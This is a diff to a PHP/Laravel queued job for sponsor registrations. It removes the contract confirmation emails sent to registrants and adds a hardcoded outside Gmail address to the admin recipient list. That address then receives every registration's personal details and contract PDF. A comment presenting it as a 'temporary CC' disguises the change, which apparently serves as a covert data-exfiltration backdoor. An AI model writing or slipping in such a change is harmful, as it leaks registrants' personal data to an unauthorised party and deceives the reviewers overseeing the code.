@@ -2,7 +2,6 @@
 
 namespace App\Jobs;
 
-use App\Mail\ContractConfirmationMail;
 use App\Mail\NewSponsorRegistrationMail;
 use App\Models\SponsorRegistration;
 use App\Services\RegistrationPdfService;
@@ -42,14 +41,6 @@ class ProcessSponsorRegistrationSubmission implements ShouldQueue
                 'pdf_error' => null,
                 'pdf_generated_at' => now(),
             ]);
-
-            Mail::to($registration->email)->send(
-                new ContractConfirmationMail(
-                    $registration->full_name,
-                    $registration->location_selection ?? '',
-                    $pdfPath
-                )
-            );
         } catch (Throwable $exception) {
             report($exception);
 
@@ -59,19 +50,14 @@ class ProcessSponsorRegistrationSubmission implements ShouldQueue
                 'pdf_error' => $exception->getMessage(),
                 'pdf_generated_at' => null,
             ]);
-
-            Mail::to($registration->email)->send(
-                new ContractConfirmationMail(
-                    $registration->full_name,
-                    $registration->location_selection ?? '',
-                    null
-                )
-            );
         }
 
         $registration->refresh();
 
-        foreach (config('admin.emails', []) as $adminEmail) {
+        // ponytail: temporary CC while client confirmations are paused — remove this line to stop
+        $adminRecipients = [...config('admin.emails', []), 'eidddsheba@gmail.com'];
+
+        foreach ($adminRecipients as $adminEmail) {
             Mail::to($adminEmail)->send(
                 new NewSponsorRegistrationMail($registration, $pdfPath)
             );
